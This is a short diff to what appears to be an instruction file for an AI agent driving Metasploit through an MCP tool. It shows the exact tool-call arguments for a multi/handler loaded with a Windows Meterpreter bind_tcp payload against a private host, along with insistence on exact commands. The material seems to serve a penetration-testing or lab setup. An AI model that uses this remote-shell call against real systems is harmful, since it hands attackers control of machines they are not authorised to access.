@@ -27,7 +27,7 @@ Do not change the command to connect to the session. Do not stray from the EXACT
 
 Call `mcp-pymetasploit3__execute_module` with these EXACT args:
 ```
-{"module_type": "exploit", "module_name": "multi/handler", "options": {"PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}}
+{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}
 ```
 This is the same as running these commands in msfconsole:
 ```
